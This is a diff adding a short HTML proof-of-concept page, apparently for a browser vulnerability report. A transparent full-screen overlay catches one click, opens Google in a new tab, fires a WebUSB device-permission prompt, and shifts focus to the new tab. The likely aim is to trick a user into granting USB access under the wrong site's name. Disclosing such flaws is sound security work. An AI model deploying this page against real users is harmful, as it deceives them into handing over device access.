@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC</title>
+<style>
+  html, body {
+    margin: 0;
+    height: 100%;
+  }
+  #overlay {
+    position: fixed;
+    inset: 0;
+    background: transparent;
+    z-index: 9999;
+  }
+</style>
+</head>
+<body>
+
+<h1 style="text-align:center;">Click anywhere</h1>
+<div id="overlay"></div>
+
+<script>
+const overlay = document.getElementById('overlay');
+
+overlay.addEventListener('click', async () => {
+  try {
+    // 1. Open Google in new tab
+    const newTab = window.open('https://www.google.com', '_blank');
+
+    // 2. Trigger USB permission
+    await navigator.usb.requestDevice({ filters: [{}] });
+
+    // 3. Shift focus to new tab (user goes there)
+    if (newTab) {
+      newTab.focus();
+    }
+
+  } catch (e) {
+    console.log(e);
+  }
+}, { once: true });
+</script>
+
+</body>
+</html>
